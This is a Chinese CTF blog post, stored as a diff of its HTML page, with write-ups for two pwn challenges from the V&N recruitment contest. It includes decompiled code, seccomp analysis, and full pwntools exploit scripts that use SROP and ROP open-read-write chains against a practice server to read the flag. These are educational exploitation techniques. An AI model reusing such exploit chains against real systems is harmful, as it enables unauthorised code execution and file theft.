@@ -1,0 +1,1168 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon00.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="周六做了一下V&amp;N招新赛，难顶，不愧是V&amp;N,不愧是南梦，我不配">
+<meta property="og:type" content="article">
+<meta property="og:title" content="V&amp;N招新赛pwn">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;29&#x2F;V-N%E6%8B%9B%E6%96%B0%E8%B5%9Bpwn&#x2F;index.html">
+<meta property="og:site_name" content="N0vice&#39;s Blog">
+<meta property="og:description" content="周六做了一下V&amp;N招新赛，难顶，不愧是V&amp;N,不愧是南梦，我不配">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;29&#x2F;V-N%E6%8B%9B%E6%96%B0%E8%B5%9Bpwn&#x2F;bqb.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;29&#x2F;V-N%E6%8B%9B%E6%96%B0%E8%B5%9Bpwn&#x2F;VN1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;29&#x2F;V-N%E6%8B%9B%E6%96%B0%E8%B5%9Bpwn&#x2F;VN2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;29&#x2F;V-N%E6%8B%9B%E6%96%B0%E8%B5%9Bpwn&#x2F;warm_up1.png">
+<meta property="article:published_time" content="2020-02-29T15:47:47.000Z">
+<meta property="article:modified_time" content="2020-03-01T05:10:10.885Z">
+<meta property="article:author" content="N0vice">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;29&#x2F;V-N%E6%8B%9B%E6%96%B0%E8%B5%9Bpwn&#x2F;bqb.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/29/V-N招新赛pwn/"/>
+
+
+
+
+
+  <title>V&N招新赛pwn | N0vice's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.1.0"></head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"/>
+<script src="/live2d-widget/autoload.js"></script>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">N0vice's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/29/V-N%E6%8B%9B%E6%96%B0%E8%B5%9Bpwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="N0vice">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="N0vice's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">V&N招新赛pwn</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-29T23:47:47+08:00">
+                2020-02-29
+              </time>
+            
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>周六做了一下V&amp;N招新赛，难顶，不愧是V&amp;N,不愧是南梦，我不配<a id="more"></a><br><img src="bqb.jpg" alt=""></p>
+<h2 id="0x01-babybabypwn"><a href="#0x01-babybabypwn" class="headerlink" title="0x01 babybabypwn"></a>0x01 babybabypwn</h2><p>这题是SROP。<br>查看保护  </p>
+<pre><code class="shell">[*] &#39;/home/N0vice/Desktop/BUUCTF/VN/vn_pwn_babybabypwn_1&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled</code></pre>
+<p>保护全开<br>main函数里调用了三个函数  </p>
+<pre><code class="C">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span>
+<span class="function"></span>{
+  sub_11B5(a1, a2, a3);
+  sub_1202();
+  sub_1347();
+  <span class="keyword">return</span> <span class="number">0L</span>L;
+}</code></pre>
+<p>第一个函数就是常规的设置缓冲区什么的,就不贴了<br>第二个函数是一些沙箱保护机制，也就是禁用了一些函数     </p>
+<pre><code class="C">__<span class="function">int64 <span class="title">sub_1202</span><span class="params">()</span></span>
+<span class="function"></span>{
+  __int64 v0; <span class="comment">// ST08_8</span>
+
+  v0 = seccomp_init(<span class="number">2147418112L</span>L);
+  seccomp_rule_add(v0, <span class="number">0L</span>L, <span class="number">41L</span>L, <span class="number">0L</span>L);
+  seccomp_rule_add(v0, <span class="number">0L</span>L, <span class="number">42L</span>L, <span class="number">0L</span>L);
+  seccomp_rule_add(v0, <span class="number">0L</span>L, <span class="number">49L</span>L, <span class="number">0L</span>L);
+  seccomp_rule_add(v0, <span class="number">0L</span>L, <span class="number">50L</span>L, <span class="number">0L</span>L);
+  seccomp_rule_add(v0, <span class="number">0L</span>L, <span class="number">56L</span>L, <span class="number">0L</span>L);
+  seccomp_rule_add(v0, <span class="number">0L</span>L, <span class="number">59L</span>L, <span class="number">0L</span>L);
+  seccomp_rule_add(v0, <span class="number">0L</span>L, <span class="number">10L</span>L, <span class="number">0L</span>L);
+  seccomp_rule_add(v0, <span class="number">0L</span>L, <span class="number">9L</span>L, <span class="number">0L</span>L);
+  seccomp_rule_add(v0, <span class="number">0L</span>L, <span class="number">57L</span>L, <span class="number">0L</span>L);
+  <span class="keyword">return</span> seccomp_load(v0);
+}</code></pre>
+<p>主要函数在这里  </p>
+<pre><code class="C"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_1347</span><span class="params">()</span></span>
+<span class="function"></span>{
+  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-110h]</span>
+  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+108h] [rbp-8h]</span>
+
+  v2 = __readfsqword(<span class="number">0x28</span>u);
+  <span class="built_in">puts</span>(<span class="string">"Welcome to v&amp;n challange!"</span>);
+  <span class="built_in">printf</span>(<span class="string">"Here is my gift: 0x%llx\n"</span>, &amp;<span class="built_in">puts</span>);
+  <span class="built_in">printf</span>(<span class="string">"Please input magic message: "</span>);
+  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);
+  syscall(<span class="number">15L</span>L, &amp;buf);
+  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;
+}</code></pre>
+<p>一开始就给了puts函数的真实地址，而且题目还说了是16的环境，给了libc。这里没有溢出，但是有一个syscall，参数是15，查了一下15是rt_sigreturn函数的系统调用号，rt_sigreturn函数对应的就是SROP的手段了。只好现学了一下SROP……<br>通过seccomp-tools查看禁用了那些函数<br><img src="VN1.png" alt=""><br>会发现禁用了execve函数和mprotect函数，那只能orw了<br>思路如下：先接收puts函数的地址，然后计算得出libc基地址libc_base，通过pwntools的SROP利用的相应模块将对应寄存器设置好参数，然后可以直接调用read函数，调用read函数之后直接orw打过去。这里提一下，因为程序开启了pie保护，所以程序中的所有找到的gadget都不能用，用ROPgadget找到的全都不是真实地址，都是一个偏移<br>exp如下:</p>
+<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span>*
+context.log_level = <span class="string">'debug'</span>
+context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
+context.arch = <span class="string">'amd64'</span>
+p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29463</span>)
+<span class="comment">#p = process("./vn_pwn_babybabypwn_1")</span>
+elf = ELF(<span class="string">"./vn_pwn_babybabypwn_1"</span>)
+libc = ELF(<span class="string">"libc-2.23_x64.so"</span>)
+stack_addr = libc.sym[<span class="string">'environ'</span>]
+p.recvuntil(<span class="string">"0x"</span>)
+puts_addr = int(p.recvline(),<span class="number">16</span>)
+libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]
+log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))
+libc.address = libc_base
+stack_addr = libc.sym[<span class="string">'environ'</span>]
+pop_rdi_ret = <span class="number">0x0000000000021102</span> + libc_base
+pop_rdx_rsi = <span class="number">0x00000000001150c9</span> + libc_base
+pop_rdx_ret = <span class="number">0x0000000000001b92</span> + libc_base
+syscall_addr = <span class="number">0x00000000000bc375</span> + libc_base
+frame = SigreturnFrame()   <span class="comment"># pwntools提供了Sigreturn Frame的构建</span>
+frame.rax = constants.SYS_read
+frame.rdi = <span class="number">0</span>
+frame.rsi = stack_addr
+frame.rdx = <span class="number">0x200</span>
+frame.rsp = stack_addr + <span class="number">8</span>
+frame.rip = syscall_addr
+<span class="comment">#gdb.attach(p)</span>
+payload = str(frame)[<span class="number">8</span>:]
+p.send(payload)
+
+orw = <span class="string">"flag"</span> + <span class="string">"\x00"</span>*<span class="number">4</span> + p64(pop_rdi_ret) + p64(stack_addr) + p64(pop_rdx_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">'open'</span>])
+orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rdx_rsi) + p64(<span class="number">0x100</span>) + p64(stack_addr) + p64(libc.symbols[<span class="string">'read'</span>])
+orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rdx_rsi) + p64(<span class="number">0x100</span>) + p64(stack_addr) + p64(libc.symbols[<span class="string">'write'</span>])
+
+p.send(orw)
+p.interactive()</code></pre>
+<p>设置rsp加8的原因是需要将flag字符串的位置留出来，发送过去的frame通过gdb调试可得，前八个是调用rt_sigreturn函数的，但是由于题中的系统调用号已经是15了，所以前8个去掉<br></br>  </p>
+<h2 id="0x02-warm-up"><a href="#0x02-warm-up" class="headerlink" title="0x02  warm_up"></a>0x02  warm_up</h2><p>这题和前面那题一开始的回显一模一样，一度怀疑做了两道一样的题<br>检查保护   </p>
+<pre><code class="shell">[*] &#39;/home/N0vice/Desktop/BUUCTF/VN/vn_pwn_warmup&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled</code></pre>
+<p>除了canary以外的都开了<br>main函数  </p>
+<pre><code class="C">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span>
+<span class="function"></span>{
+  sub_80A();
+  <span class="built_in">puts</span>(<span class="string">"This is a easy challange for you."</span>);
+  <span class="built_in">printf</span>(<span class="string">"Here is my gift: 0x%llx\n"</span>, &amp;<span class="built_in">puts</span>);
+  sub_84D();
+  sub_9D3();
+  <span class="keyword">return</span> <span class="number">0L</span>L;
+}</code></pre>
+<p>第一个照例是setbuf啥的不贴了<br>第二个函数  </p>
+<pre><code class="C"><span class="function"><span class="keyword">int</span> <span class="title">sub_84D</span><span class="params">()</span></span>
+<span class="function"></span>{
+  __int16 v1; <span class="comment">// [rsp+0h] [rbp-70h]</span>
+  __int16 *v2; <span class="comment">// [rsp+8h] [rbp-68h]</span>
+  __int16 v3; <span class="comment">// [rsp+10h] [rbp-60h]</span>
+  <span class="keyword">char</span> v4; <span class="comment">// [rsp+12h] [rbp-5Eh]</span>
+  <span class="keyword">char</span> v5; <span class="comment">// [rsp+13h] [rbp-5Dh]</span>
+  <span class="keyword">int</span> v6; <span class="comment">// [rsp+14h] [rbp-5Ch]</span>
+  __int16 v7; <span class="comment">// [rsp+18h] [rbp-58h]</span>
+  <span class="keyword">char</span> v8; <span class="comment">// [rsp+1Ah] [rbp-56h]</span>
+  <span class="keyword">char</span> v9; <span class="comment">// [rsp+1Bh] [rbp-55h]</span>
+  <span class="keyword">int</span> v10; <span class="comment">// [rsp+1Ch] [rbp-54h]</span>
+  <span class="keyword">char</span> v11; <span class="comment">// [rsp+22h] [rbp-4Eh]</span>
+  <span class="keyword">char</span> v12; <span class="comment">// [rsp+23h] [rbp-4Dh]</span>
+  <span class="keyword">int</span> v13; <span class="comment">// [rsp+24h] [rbp-4Ch]</span>
+  __int16 v14; <span class="comment">// [rsp+28h] [rbp-48h]</span>
+  <span class="keyword">char</span> v15; <span class="comment">// [rsp+2Ah] [rbp-46h]</span>
+  <span class="keyword">char</span> v16; <span class="comment">// [rsp+2Bh] [rbp-45h]</span>
+  <span class="keyword">int</span> v17; <span class="comment">// [rsp+2Ch] [rbp-44h]</span>
+  __int16 v18; <span class="comment">// [rsp+30h] [rbp-40h]</span>
+  <span class="keyword">char</span> v19; <span class="comment">// [rsp+32h] [rbp-3Eh]</span>
+  <span class="keyword">char</span> v20; <span class="comment">// [rsp+33h] [rbp-3Dh]</span>
+  <span class="keyword">int</span> v21; <span class="comment">// [rsp+34h] [rbp-3Ch]</span>
+  __int16 v22; <span class="comment">// [rsp+38h] [rbp-38h]</span>
+  <span class="keyword">char</span> v23; <span class="comment">// [rsp+3Ah] [rbp-36h]</span>
+  <span class="keyword">char</span> v24; <span class="comment">// [rsp+3Bh] [rbp-35h]</span>
+  <span class="keyword">int</span> v25; <span class="comment">// [rsp+3Ch] [rbp-34h]</span>
+  __int16 v26; <span class="comment">// [rsp+40h] [rbp-30h]</span>
+  <span class="keyword">char</span> v27; <span class="comment">// [rsp+42h] [rbp-2Eh]</span>
+  <span class="keyword">char</span> v28; <span class="comment">// [rsp+43h] [rbp-2Dh]</span>
+  <span class="keyword">int</span> v29; <span class="comment">// [rsp+44h] [rbp-2Ch]</span>
+  __int16 v30; <span class="comment">// [rsp+48h] [rbp-28h]</span>
+  <span class="keyword">char</span> v31; <span class="comment">// [rsp+4Ah] [rbp-26h]</span>
+  <span class="keyword">char</span> v32; <span class="comment">// [rsp+4Bh] [rbp-25h]</span>
+  <span class="keyword">int</span> v33; <span class="comment">// [rsp+4Ch] [rbp-24h]</span>
+  __int16 v34; <span class="comment">// [rsp+50h] [rbp-20h]</span>
+  <span class="keyword">char</span> v35; <span class="comment">// [rsp+52h] [rbp-1Eh]</span>
+  <span class="keyword">char</span> v36; <span class="comment">// [rsp+53h] [rbp-1Dh]</span>
+  <span class="keyword">int</span> v37; <span class="comment">// [rsp+54h] [rbp-1Ch]</span>
+  __int16 v38; <span class="comment">// [rsp+58h] [rbp-18h]</span>
+  <span class="keyword">char</span> v39; <span class="comment">// [rsp+5Ah] [rbp-16h]</span>
+  <span class="keyword">char</span> v40; <span class="comment">// [rsp+5Bh] [rbp-15h]</span>
+  <span class="keyword">int</span> v41; <span class="comment">// [rsp+5Ch] [rbp-14h]</span>
+  __int16 v42; <span class="comment">// [rsp+60h] [rbp-10h]</span>
+  <span class="keyword">char</span> v43; <span class="comment">// [rsp+62h] [rbp-Eh]</span>
+  <span class="keyword">char</span> v44; <span class="comment">// [rsp+63h] [rbp-Dh]</span>
+  <span class="keyword">int</span> v45; <span class="comment">// [rsp+64h] [rbp-Ch]</span>
+  <span class="keyword">char</span> v46; <span class="comment">// [rsp+6Ah] [rbp-6h]</span>
+  <span class="keyword">char</span> v47; <span class="comment">// [rsp+6Bh] [rbp-5h]</span>
+  <span class="keyword">int</span> v48; <span class="comment">// [rsp+6Ch] [rbp-4h]</span>
+
+  prctl(<span class="number">38</span>, <span class="number">1L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L);
+  v3 = <span class="number">32</span>;
+  v4 = <span class="number">0</span>;
+  v5 = <span class="number">0</span>;
+  v6 = <span class="number">4</span>;
+  v7 = <span class="number">21</span>;
+  v8 = <span class="number">0</span>;
+  v9 = <span class="number">9</span>;
+  v10 = <span class="number">-1073741762</span>;
+  v11 = <span class="number">0</span>;
+  v12 = <span class="number">0</span>;
+  v13 = <span class="number">0</span>;
+  v14 = <span class="number">53</span>;
+  v15 = <span class="number">7</span>;
+  v16 = <span class="number">0</span>;
+  v17 = <span class="number">0x40000000</span>;
+  v18 = <span class="number">21</span>;
+  v19 = <span class="number">6</span>;
+  v20 = <span class="number">0</span>;
+  v21 = <span class="number">59</span>;
+  v22 = <span class="number">21</span>;
+  v23 = <span class="number">0</span>;
+  v24 = <span class="number">4</span>;
+  v25 = <span class="number">1</span>;
+  v26 = <span class="number">32</span>;
+  v27 = <span class="number">0</span>;
+  v28 = <span class="number">0</span>;
+  v29 = <span class="number">36</span>;
+  v30 = <span class="number">21</span>;
+  v31 = <span class="number">0</span>;
+  v32 = <span class="number">2</span>;
+  v33 = <span class="number">0</span>;
+  v34 = <span class="number">32</span>;
+  v35 = <span class="number">0</span>;
+  v36 = <span class="number">0</span>;
+  v37 = <span class="number">32</span>;
+  v38 = <span class="number">21</span>;
+  v39 = <span class="number">1</span>;
+  v40 = <span class="number">0</span>;
+  v41 = <span class="number">16</span>;
+  v42 = <span class="number">6</span>;
+  v43 = <span class="number">0</span>;
+  v44 = <span class="number">0</span>;
+  v45 = <span class="number">2147418112</span>;
+  v46 = <span class="number">0</span>;
+  v47 = <span class="number">0</span>;
+  v48 = <span class="number">0</span>;
+  v1 = <span class="number">12</span>;
+  v2 = &amp;v3;
+  <span class="keyword">return</span> prctl(<span class="number">22</span>, <span class="number">2L</span>L, &amp;v1, *&amp;v1, &amp;v3, *&amp;v3, *&amp;v7, <span class="number">32L</span>L, *&amp;v14, *&amp;v18, *&amp;v22, *&amp;v26, *&amp;v30, *&amp;v34, *&amp;v38, *&amp;v42, <span class="number">6L</span>L);
+}</code></pre>
+<p>这个函数也把execve禁用了<br><img src="VN2.png" alt=""><br>那还是只能orw一把梭了<br>在第二次输入的时候结尾加一个pop_rdi_ret，gdb跟一下会发现将第一次输入的内容pop到rdi中了，可知两个栈是相连的，执行完下面的就会继续执行第一次输入的<br><img src="warm_up1.png" alt=""><br>那我们布置好参数调用一次read将flag字符串读到一个可写的区域，然后orw打过去就行<br>exp:  </p>
+<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span>*
+context.log_level = <span class="string">'debug'</span>
+context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
+context.arch = <span class="string">'amd64'</span>
+p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27383</span>)
+<span class="comment">#p = process("./vn_pwn_warmup")</span>
+elf = ELF(<span class="string">"./vn_pwn_warmup"</span>)
+libc = ELF(<span class="string">"libc-2.23_x64.so"</span>)
+lib = process(<span class="string">"libc-2.23_x64.so"</span>)
+sleep(<span class="number">0.1</span>)
+p.recvuntil(<span class="string">"0x"</span>)
+puts_addr = int(p.recvline(),<span class="number">16</span>)
+libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]
+log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))
+libc.address = libc_base
+pop_rdi_ret = <span class="number">0x0000000000021102</span>+libc_base
+pop_rdx_rsi = <span class="number">0x00000000001150c9</span>+libc_base
+ret = <span class="number">0x0000000000000937</span> + libc_base
+stack_addr = libc.sym[<span class="string">'environ'</span>]  <span class="comment"># environ是libc存储的栈地址</span>
+<span class="comment">#gdb.attach(p)</span>
+payload = p64(<span class="number">0</span>) + p64(pop_rdx_rsi) + p64(<span class="number">0x8</span>) + p64(stack_addr) + p64(libc.sym[<span class="string">'read'</span>])  <span class="comment">#调用read函数，第一个参数写在了第二次输入的最后</span>
+payload += p64(pop_rdi_ret) + p64(stack_addr) + p64(pop_rdx_rsi) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(libc.sym[<span class="string">'open'</span>])
+payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rdx_rsi) + p64(<span class="number">0x100</span>) + p64(stack_addr+<span class="number">8</span>) + p64(libc.symbols[<span class="string">'read'</span>])
+payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rdx_rsi) + p64(<span class="number">0x100</span>) + p64(stack_addr+<span class="number">8</span>) + p64(libc.symbols[<span class="string">'write'</span>])
+payload += <span class="string">"a"</span>*(<span class="number">0x180</span>-len(payload))
+<span class="comment">#gdb.attach(p)</span>
+p.send(payload)
+sleep(<span class="number">0.1</span>)
+
+payload = <span class="string">"a"</span>*<span class="number">0x78</span> + p64(pop_rdi_ret)
+p.recvuntil(<span class="string">"name?"</span>)
+p.send(payload)
+p.send(<span class="string">"flag\x00\x00\x00\x00"</span>)
+p.interactive()</code></pre>
+<p>参考链接:<br><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/87447.html</a> (SROP学习)<br><a href="https://www.jianshu.com/p/ca4a5dacd1a2" target="_blank" rel="noopener">https://www.jianshu.com/p/ca4a5dacd1a2</a><br><a href="https://www.cnblogs.com/junmoxiao/p/6741642.html" target="_blank" rel="noopener">https://www.cnblogs.com/junmoxiao/p/6741642.html</a>  </p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的鼓励将支持我继续努力！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="N0vice 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="N0vice 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    N0vice
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2020/02/29/V-N%E6%8B%9B%E6%96%B0%E8%B5%9Bpwn/" title="V&N招新赛pwn">http://yoursite.com/2020/02/29/V-N%E6%8B%9B%E6%96%B0%E8%B5%9Bpwn/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/24/Use-After-Free/" rel="next" title="Use-After-Free">
+                <i class="fa fa-chevron-left"></i> Use-After-Free
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/06/unlink%E5%AD%A6%E4%B9%A0/" rel="prev" title="unlink学习">
+                unlink学习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
